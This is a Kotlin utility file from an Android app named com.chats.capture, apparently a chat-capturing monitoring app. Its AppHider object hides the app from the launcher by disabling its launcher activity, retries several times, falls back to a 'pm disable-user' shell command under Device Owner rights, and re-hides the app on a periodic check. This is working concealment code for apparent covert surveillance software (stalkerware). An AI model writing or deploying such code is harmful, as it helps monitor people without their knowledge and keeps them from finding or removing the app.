package com.chats.capture.utils

import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.pm.PackageManager
import android.os.Build
import com.chats.capture.mdm.DeviceOwnerReceiver
import timber.log.Timber

/**
 * Utility to completely hide the app from launcher and ensure it stays hidden
 */
object AppHider {
    
    private const val LAUNCHER_ACTIVITY_CLASS = "com.chats.capture.ui.SettingsLauncherActivity"
    
    /**
     * Hide app from launcher completely
     * Uses multiple methods to ensure it works
     */
    fun hide(context: Context) {
        try {
            // Verify app is installed and log status
            val installationStatus = AppInstallationChecker.checkInstallationStatus(context)
            if (!installationStatus.isInstalled) {
                Timber.tag("APP_HIDER").w("Package not found, cannot hide from launcher: ${installationStatus.error}")
                return
            }
            
            Timber.tag("APP_HIDER").d("App installation verified: ${installationStatus.appLabel} v${installationStatus.versionName}")
            
            // Check if Device Owner is active (gives us more permissions)
            var isDeviceOwner = false
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                try {
                    val devicePolicyManager = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as? DevicePolicyManager
                    isDeviceOwner = devicePolicyManager?.isDeviceOwnerApp(context.packageName) == true
                    Timber.tag("APP_HIDER").d("Device Owner status: $isDeviceOwner")
                } catch (e: Exception) {
                    Timber.tag("APP_HIDER").d("Error checking Device Owner: ${e.message}")
                }
            }
            
            // Use package name explicitly to avoid issues
            val componentName = ComponentName(context.packageName, LAUNCHER_ACTIVITY_CLASS)
            val packageManager = context.packageManager
            
            // Check current state before changing
            val currentState = packageManager.getComponentEnabledSetting(componentName)
            Timber.tag("APP_HIDER").d("Current component state: $currentState (0=default, 1=enabled, 2=disabled)")
            
            // Always try to disable, even if already disabled (some launchers ignore the state)
            Timber.tag("APP_HIDER").d("Attempting to hide app from launcher...")
            
            // Method 1: Disable with DONT_KILL_APP
            try {
                packageManager.setComponentEnabledSetting(
                    componentName,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP
                )
                Timber.tag("APP_HIDER").d("Disabled component (attempt 1)")
                
                Thread.sleep(300)
                var newState = packageManager.getComponentEnabledSetting(componentName)
                Timber.tag("APP_HIDER").d("State after attempt 1: $newState")
                
                if (newState == PackageManager.COMPONENT_ENABLED_STATE_DISABLED) {
                    Timber.tag("APP_HIDER").i("✅ App successfully hidden from launcher")
                    return
                }
            } catch (e: Exception) {
                Timber.tag("APP_HIDER").e(e, "Error in attempt 1: ${e.message}")
            }
            
            // Method 2: Retry with longer wait
            try {
                packageManager.setComponentEnabledSetting(
                    componentName,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP
                )
                Timber.tag("APP_HIDER").d("Disabled component (attempt 2)")
                
                Thread.sleep(500)
                var newState = packageManager.getComponentEnabledSetting(componentName)
                Timber.tag("APP_HIDER").d("State after attempt 2: $newState")
                
                if (newState == PackageManager.COMPONENT_ENABLED_STATE_DISABLED) {
                    Timber.tag("APP_HIDER").i("✅ App successfully hidden from launcher (retry)")
                    return
                }
            } catch (e: Exception) {
                Timber.tag("APP_HIDER").e(e, "Error in attempt 2: ${e.message}")
            }
            
            // Method 3: Try using application context
            try {
                val appContext = context.applicationContext
                val appPm = appContext.packageManager
                appPm.setComponentEnabledSetting(
                    componentName,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP
                )
                Timber.tag("APP_HIDER").d("Disabled component using application context")
                
                Thread.sleep(300)
                val finalState = appPm.getComponentEnabledSetting(componentName)
                Timber.tag("APP_HIDER").d("State after application context: $finalState")
                
                if (finalState == PackageManager.COMPONENT_ENABLED_STATE_DISABLED) {
                    Timber.tag("APP_HIDER").i("✅ App successfully hidden using application context")
                } else {
                    Timber.tag("APP_HIDER").w("⚠️ Component state is $finalState (expected 2=DISABLED)")
                    
                    // If Device Owner, try shell command as last resort
                    if (isDeviceOwner && Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                        try {
                            val componentString = "${context.packageName}/${LAUNCHER_ACTIVITY_CLASS}"
                            val process = Runtime.getRuntime().exec("pm disable-user ${context.packageName}/${LAUNCHER_ACTIVITY_CLASS}")
                            val exitCode = process.waitFor()
                            Timber.tag("APP_HIDER").d("Shell command result: exitCode=$exitCode")
                            
                            Thread.sleep(500)
                            val shellState = appPm.getComponentEnabledSetting(componentName)
                            Timber.tag("APP_HIDER").d("State after shell command: $shellState")
                            
                            if (shellState == PackageManager.COMPONENT_ENABLED_STATE_DISABLED) {
                                Timber.tag("APP_HIDER").i("✅ App successfully hidden using shell command")
                            }
                        } catch (e: Exception) {
                            Timber.tag("APP_HIDER").d("Shell command not available or failed: ${e.message}")
                        }
                    }
                }
            } catch (e: Exception) {
                Timber.tag("APP_HIDER").e(e, "Error using application context: ${e.message}")
            }
            
        } catch (e: SecurityException) {
            Timber.tag("APP_HIDER").w(e, "Security exception - may need Device Owner or system permissions")
            Timber.tag("APP_HIDER").w("If app is still visible, ensure Device Owner is active or use ADB: pm disable-user ${context.packageName}/com.chats.capture.ui.SettingsLauncherActivity")
        } catch (e: Exception) {
            Timber.tag("APP_HIDER").e(e, "Error hiding app: ${e.message}")
        }
    }
    
    /**
     * Check if app is hidden from launcher
     */
    fun isHidden(context: Context): Boolean {
        return try {
            val componentName = ComponentName(context, LAUNCHER_ACTIVITY_CLASS)
            val state = context.packageManager.getComponentEnabledSetting(componentName)
            state == PackageManager.COMPONENT_ENABLED_STATE_DISABLED
        } catch (e: Exception) {
            Timber.e(e, "Error checking if app is hidden")
            false
        }
    }
    
    /**
     * Ensure app stays hidden (call this periodically)
     */
    fun ensureHidden(context: Context) {
        if (!isHidden(context)) {
            hide(context)
        }
    }
}
